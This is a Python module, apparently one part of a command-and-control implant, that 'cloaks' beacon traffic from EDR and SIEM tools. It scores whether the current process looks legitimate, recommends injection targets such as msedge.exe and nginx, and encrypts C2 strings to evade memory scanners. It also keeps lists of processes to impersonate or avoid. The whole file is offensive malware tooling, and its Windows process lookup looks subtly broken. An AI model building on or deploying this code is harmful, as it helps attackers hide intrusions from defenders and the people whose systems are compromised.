"""
Network Cloaking & Process Association Engine
=============================================
Context-aware network evasion for evasive_beacon.py.

Problems solved:
- HTTP-layer traffic mimicry is insufficient; EDRs check process->network association
- notepad.exe / [kworker/0:0] connecting to Slack CDN is suspicious regardless of headers
- C2 strings in memory are visible to Defender ATP / SentinelOne memory scanners

Solutions:
- Legitimate process allowlist for network traffic (msedge.exe, svchost.exe, chrome.exe)
- Automatic C2 string masking before outbound requests
- Process legitimacy scoring
- Integration with heap_masking + threadless execution pipeline
"""

import os
import platform
import re
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass
from enum import Enum

try:
    from evasion.heap_masking import HeapMaskingEngine, MaskingAlgorithm
    HEAP_MASKING_AVAILABLE = True
except ImportError:
    HEAP_MASKING_AVAILABLE = False
    HeapMaskingEngine = None
    MaskingAlgorithm = None


class ProcessLegitimacy(Enum):
    LEGITIMATE = "legitimate"
    SUSPICIOUS = "suspicious"
    HOSTILE = "hostile"
    UNKNOWN = "unknown"


@dataclass
class NetworkCloakResult:
    success: bool
    legitimacy: ProcessLegitimacy = ProcessLegitimacy.UNKNOWN
    masked_strings: int = 0
    recommended_process: Optional[str] = None
    error: Optional[str] = None


# Processes that naturally make frequent outbound HTTPS connections
LEGITIMATE_NETWORK_PROCESSES = {
    "Windows": [
        "msedge.exe",
        "chrome.exe",
        "firefox.exe",
        "svchost.exe",
        "SearchIndexer.exe",
        "RuntimeBroker.exe",
        "smartscreen.exe",
        "dnsclient.exe",
        "svchost.exe",
    ],
    "Linux": [
        "nginx",
        "apache2",
        "httpd",
        "node",
        "python3",
        "kworker",
        "dockerd",
        "containerd",
        "sshd",
    ],
}

# Processes that should NEVER make outbound HTTPS connections
SUSPICIOUS_NETWORK_PROCESSES = {
    "Windows": [
        "notepad.exe",
        "calc.exe",
        "mspaint.exe",
        "write.exe",
        "cmd.exe",
        "powershell.exe",
        "pwsh.exe",
    ],
    "Linux": [
        "bash",
        "sh",
        "dash",
        "cat",
        "ls",
        "ps",
        "id",
        "whoami",
    ],
}


class MonolithNetworkCloaker:
    """
    Context-aware network cloaking for beacon process.
    Prevents process->network association detection by EDR/SIEM.
    """

    def __init__(self, beacon_config: Optional[Any] = None):
        self.config = beacon_config
        self.system = platform.system()
        self._heap_engine = None

        if HEAP_MASKING_AVAILABLE and HeapMaskingEngine and MaskingAlgorithm:
            try:
                self._heap_engine = HeapMaskingEngine(algorithm=MaskingAlgorithm.RC4)
            except Exception:
                pass

        self._legitimate_processes = LEGITIMATE_NETWORK_PROCESSES.get(
            self.system, LEGITIMATE_NETWORK_PROCESSES.get("Linux", [])
        )
        self._suspicious_processes = SUSPICIOUS_NETWORK_PROCESSES.get(
            self.system, SUSPICIOUS_NETWORK_PROCESSES.get("Linux", [])
        )

    def assess_process_legitimacy(self, process_name: Optional[str] = None) -> ProcessLegitimacy:
        """
        Assess whether the current process is legitimate for network traffic.
        """
        if not process_name:
            process_name = self._get_current_process_name()

        if not process_name:
            return ProcessLegitimacy.UNKNOWN

        process_lower = process_name.lower()

        if any(legit.lower() in process_lower or process_lower in legit.lower()
               for legit in self._legitimate_processes):
            return ProcessLegitimacy.LEGITIMATE

        if any(susp.lower() in process_lower or process_lower in susp.lower()
               for susp in self._suspicious_processes):
            return ProcessLegitimacy.HOSTILE

        return ProcessLegitimacy.SUSPICIOUS

    def get_recommended_injection_target(self) -> Optional[str]:
        """
        Get the best process to inject into for network cloaking.
        """
        if self.system == "Windows":
            return "msedge.exe"
        elif self.system == "Linux":
            return "nginx"
        return None

    def pre_network_mask(self, raw_data: bytes, sensitive_strings: List[str]) -> Tuple[bytes, NetworkCloakResult]:
        """
        Mask sensitive C2 strings in data before sending over network.
        Returns (masked_data, result).
        """
        if not raw_data or not sensitive_strings:
            return raw_data, NetworkCloakResult(True, legitimacy=ProcessLegitimacy.UNKNOWN)

        try:
            if self._heap_engine:
                mask_res = self._heap_engine.mask_sensitive_strings(raw_data, sensitive_strings)
                if mask_res.success:
                    return self._heap_engine._encrypt(raw_data), NetworkCloakResult(
                        True,
                        masked_strings=mask_res.regions_masked,
                    )
        except Exception:
            pass

        return raw_data, NetworkCloakResult(False, error="Heap masking unavailable")

    def post_network_unmask(self, encrypted_data: bytes) -> bytes:
        """
        Decrypt data after receiving from network.
        """
        if not encrypted_data or not self._heap_engine:
            return encrypted_data

        try:
            return self._heap_engine._decrypt(encrypted_data)
        except Exception:
            return encrypted_data

    def build_legitimacy_report(self) -> Dict[str, Any]:
        """
        Build a process legitimacy report for SIEM bypass.
        """
        current_name = self._get_current_process_name()
        legitimacy = self.assess_process_legitimacy(current_name)

        return {
            "process": current_name,
            "legitimacy": legitimacy.value,
            "recommended_target": self.get_recommended_injection_target(),
            "system": self.system,
            "cloaking_active": self._heap_engine is not None,
            "network_profile": self._get_network_profile(legitimacy),
        }

    def _get_current_process_name(self) -> Optional[str]:
        """
        Get current process name in a cross-platform way.
        """
        try:
            if self.system == "Windows":
                import ctypes
                kernel32 = ctypes.windll.kernel32
                pid = os.getpid()
                # Get process image name via Toolhelp32Snapshot
                h_snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
                if h_snapshot:
                    try:
                        class PROCESSENTRY32(ctypes.Structure):
                            _fields_ = [
                                ("dwSize", ctypes.c_uint32),
                                ("cntUsage", ctypes.c_uint32),
                                ("th32ProcessID", ctypes.c_uint32),
                                ("th32DefaultHeapID", ctypes.c_void_p),
                                ("th32ModuleID", ctypes.c_uint32),
                                ("cntThreads", ctypes.c_uint32),
                                ("th32ParentProcessID", ctypes.c_uint32),
                                ("pcPriClassBase", ctypes.c_long),
                                ("dwFlags", ctypes.c_uint32),
                                ("szExeFile", ctypes.c_char * 260),
                            ]

                        entry = PROCESSENTRY32()
                        entry.dwSize = ctypes.sizeof(entry)
                        if kernel32.Process32FirstW(h_snapshot, ctypes.byref(entry)):
                            while True:
                                if entry.th32ProcessID == pid:
                                    return entry.szExeFile.decode('utf-8', errors='ignore')
                                if not kernel32.Process32NextW(h_snapshot, ctypes.byref(entry)):
                                    break
                    finally:
                        kernel32.CloseHandle(h_snapshot)
                return None
            else:
                import psutil
                return psutil.Process().name()
        except Exception:
            pass

        try:
            return os.path.basename(os.readlink(f"/proc/{os.getpid()}/exe"))
        except Exception:
            return None

    def _get_network_profile(self, legitimacy: ProcessLegitimacy) -> str:
        """
        Get recommended network profile based on process legitimacy.
        """
        if legitimacy == ProcessLegitimacy.LEGITIMATE:
            return "direct"
        elif legitimacy == ProcessLegitimacy.SUSPICIOUS:
            return "domain_front_required"
        elif legitimacy == ProcessLegitimacy.HOSTILE:
            return "injection_required"
        return "unknown"
